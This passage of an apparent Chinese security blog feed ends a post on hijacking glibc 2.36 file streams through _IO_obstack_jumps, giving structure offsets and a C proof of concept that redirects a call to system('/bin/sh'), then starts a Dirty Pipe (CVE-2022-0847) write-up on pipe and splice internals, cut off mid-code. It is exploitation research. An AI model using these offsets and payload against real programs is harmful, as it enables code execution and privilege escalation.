 JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要利用的结构体为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是在<code>IO_FILE</code>结构体下加一个<code>obstack</code>结构体指针。下面则是<code>obstack</code>结构体的定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="keyword">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="keyword">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="keyword">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="keyword">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="keyword">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="keyword">void</span> (*freefun) (<span class="keyword">void</span> *, struct _obstack_chunk *);</span><br><span class="line">  <span class="keyword">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="keyword">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="keyword">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，上述的vtable中只有<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>这样两个函数，首先关注前一个</p><h3 id="IO-obstack-overflow"><a href="#IO-obstack-overflow" class="headerlink" title="_IO_obstack_overflow"></a>_IO_obstack_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_IO_obstack_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="keyword">int</span> size;</span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);</span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到其中存在一个assert，注意下面如果我们走exit这条路来清空所有缓存时触发的话就会出现rsi必定为<code>-1</code>的情况，所以此路不通</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201130547767.png"                      alt="image-20221201130547767"                ></p><h3 id="IO-obstack-xsputn"><a href="#IO-obstack-xsputn" class="headerlink" title="_IO_obstack_xsputn"></a>_IO_obstack_xsputn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((struct _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们的目标时调用到<code>obstack_grow</code>函数，所以我们需要进入这个if语句，这一点很好说，如果我们可以控制这个结构体就可以非常轻松的控制这里的值而后进入if语句，随后又会执行<code>obstack_blank_fast</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</span><br></pre></td></tr></table></figure><p>这个其实是一个宏定义，可以看到内部其实不会特别影响后续的内容。在继续执行就会进入我们期望的函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="meta-keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到这个也是一个宏定义，同样的我们又必须通过<code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code>这条if语句才能调用到<code>_obstack_newchunk</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">  _obstack_newchunk (struct obstack *h, <span class="keyword">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="keyword">long</span> new_size;</span><br><span class="line">  <span class="keyword">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">long</span> already;</span><br><span class="line">  <span class="keyword">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  <span class="keyword">if</span> (!new_chunk)</span><br><span class="line">    (*obstack_alloc_failed_handler)();</span><br><span class="line">  h-&gt;chunk = new_chunk;</span><br><span class="line">  new_chunk-&gt;prev = old_chunk;</span><br><span class="line">  new_chunk-&gt;limit = h-&gt;chunk_limit = (<span class="keyword">char</span> *) new_chunk + new_size;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里可以直接调用到我们期望的宏定义<code>CALL_CHUNKFUN</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>可以看到这里存在直接拿指针当作函数的操作<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，条件也就是<code>(((h)-&gt;use_extra_arg)</code>不为0；</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以从上到下的调用链也是可以直接写出来了:</p><p><code>_IO_obstack_xsputn</code>=&gt;<code>obstack_grow</code>=&gt;<code>_obstack_newchunk</code>=&gt;<code>CALL_CHUNKFUN</code>=&gt;<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p><p>最后再根据结构体属性的偏移写上上述约束的值即可。</p><p>当<code>_IO_list_all</code>指向我们可控A地址时，我们需要对A地址写入如下数据：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">A + <span class="number">0x18</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x20</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x28</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0x30</span> = <span class="number">0</span>;</span><br><span class="line">A + <span class="number">0x38</span> = system_addr;</span><br><span class="line">A + <span class="number">0x48</span> = bin_sh_addr;</span><br><span class="line">A + <span class="number">0x50</span> = <span class="number">1</span>;</span><br><span class="line">A + <span class="number">0xd8</span> = _IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">A + <span class="number">0xe0</span> = A;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221201134245450.png"                      alt="image-20221201134245450"                ></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> bin_sh_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> libc_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> printf_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *IO_2_1_stderr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> IO_obstack_jumps;</span><br><span class="line"><span class="built_in">strcpy</span>(bin_sh_addr,<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;start!\n&quot;</span>);</span><br><span class="line">printf_addr = <span class="built_in">printf</span>;</span><br><span class="line">libc_base = printf_addr - <span class="number">0x55700</span>;</span><br><span class="line"></span><br><span class="line">IO_2_1_stderr = libc_base + <span class="number">0x1f7680</span>;</span><br><span class="line">IO_obstack_jumps = libc_base + <span class="number">0x1f33a0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x28</span>/<span class="number">8</span>)) = <span class="number">0x1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x30</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x18</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x20</span>/<span class="number">8</span>)) = <span class="number">0</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x50</span>/<span class="number">8</span>)) = <span class="number">1</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xd8</span>/<span class="number">8</span>)) = IO_obstack_jumps+<span class="number">0x20</span>;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0xe0</span>/<span class="number">8</span>)) = IO_2_1_stderr;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x38</span>/<span class="number">8</span>)) = system;</span><br><span class="line">*(IO_2_1_stderr + (<span class="number">0x48</span>/<span class="number">8</span>)) = bin_sh_addr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上libc均使用:<code>Ubuntu GLIBC 2.36-0ubuntu4</code></p><hr><p>参考文章</p><p><a class="link"   href="https://tttang.com/archive/1845/#toc" >https://tttang.com/archive/1845/#toc<i class="fas fa-external-link-alt"></i></a>_</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近期又出现一个新的关于&lt;code&gt;IO_FILE&lt;/code&gt;的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847 Dirty Pipe</title>
    <link href="https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/"/>
    <id>https://cv196082.gitee.io/2022/11/22/CVE-2022-0847-Dirty-Pipe/</id>
    <published>2022-11-22T12:54:31.000Z</published>
    <updated>2022-11-22T12:54:02.950Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>持续性摆烂一段时间了，又想看jyy的课，又要期末考试了，好烦！索性花点时间把Gyan神上半年叫我复现的CVE复现了。</p><p>这个CVE允许向任意可读文件中写数据，可造成非特权进程向root进程注入代码。该漏洞发生linux内核空间通过splice方式实现数据拷贝时，以”零拷贝”的形式将文件发送到pipe，并且没有初始化pipe缓存页管理数据结构的flag成员。</p><h2 id="零拷贝"><a href="#零拷贝" class="headerlink" title="零拷贝"></a>零拷贝</h2><p>首先需要了解一下零拷贝的概念，在普通的文件传输过程是如下图所示，可以看到这里进行了四次上下文切换，导致不必要的浪费和开销</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/f31ece783dd86621734188fa2d58b4bb.png"                                     ></p><p>所以linux内核出现了解决办法就是可以快速高效地将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间，而这也就是所谓的零拷贝，在linux内核中有splice方式来解决。</p><p>这个系统调用不仅支持网络层面的传输，如果用户拥有两个已经打开的文件描述符可以任意文件相互连接，而不仅限于socket。</p><h2 id="pipe原理"><a href="#pipe原理" class="headerlink" title="pipe原理"></a>pipe原理</h2><p>pipe在前面的利用中也使用到过，不过大多是利用它申请的结构体的堆块劫持ops或者泄漏，这里主要是使用他初始化会带来的内容。</p><p>首先我们清楚pipe会创建两个文件描述符，一个是输入另一个输出。在内核中pipe缓冲区的总长度是65536字节，一共16页，这里页与页之间不连续是通过数组进行管理的，维护的是一个类似于链表的结构。以前就提到过，pipe在内核中是下图这样的表现形式：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/640.jpeg"                                     ></p><p>有pipe_buffer结构体只想page，而pipe_buffer结构体在往期kernel中有详细介绍，这里就不再赘述了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function"><span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="keyword">ssize_t</span> chars;</span><br><span class="line"><span class="keyword">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;</span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Only wake up if the pipe started out empty, since</span></span><br><span class="line"><span class="comment"> * otherwise there should be no readers waiting.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If it wasn&#x27;t empty we try to merge new data 